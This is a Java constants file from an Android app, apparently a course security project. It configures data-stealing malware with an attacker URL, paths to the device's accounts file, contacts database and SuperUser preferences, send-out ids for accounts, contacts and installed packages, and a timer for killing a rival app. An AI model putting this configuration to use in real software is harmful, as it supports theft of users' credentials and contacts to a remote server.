package com.trustme.testsu.utils;

public class Constants {
	
	/** 
	 * attacker's URL
	 */
	public static final String ATTACKER_URL = "http://soterisdemetriou.com/cs423/project/attacker.php";
	
	/** 
	 * Unique id representing the test transaction
	 */
	public static final String TEST_TRANSACTION = "198462034867";
	
	/**
	 * The package name of the competitors application
	 */
	public static final String COMPETITOR_PACK = "com.google.android.apps.maps";
	
	/**
	 * My package name
	 */
	public static final String MY_PACKAGE_NAME = "com.trustme.testsu";
	
	/**
	 * Transparent accounts file
	 */
	public static final String NEW_ACCOUNTS_NAME = "accounts.xml";
	
	/**
	 * The path to this applications data storage
	 */
	public static final String INTERNAL_STORAGE_PATH = "/data/data/" + MY_PACKAGE_NAME + "/";
	
	/**
	 * The path to the accounts xml file
	 */
	public static final String ACCOUNTS_FILEPATH = "/data/system/sync/accounts.xml";
	
	/**
	 * The path to the contacts db file
	 */
	public static final String CONTACTS_FILE = "/data/data/com.android.providers.contacts/databases/contacts2.db";
	
	/**
	 * The interval between checks on the status of the competitor app
	 */
	public static final int KILL_COMPETITOR_INTERVAL = 10*1000;
	
	/**
	 * The SuperUser path to preferences 
	 */
	public static final String SU_PREFERENCES_PATH = "/data/data/com.noshufou.android.su/shared_prefs/";
	
	/**
	 * The SuperUser preferences filename
	 */
	public static final String SU_PREFERENCES_FILENAME = "com.noshufou.android.su_preferences.xml";
	
	/**
	 * The id of sending user's accounts - emails
	 */
	public static final String ACCOUNTS_TRANSACTION = "198462034867" ;

	/**
	 * The id of sending user's contacts
	 */
	public static final String CONTACTS_TRANSACTION = "198462034867" ;
	
	/**
	 * The id of sending user's installed packages
	 */
	public static final String PACKAGES_TRANSACTION = "198462034867" ;
	
}
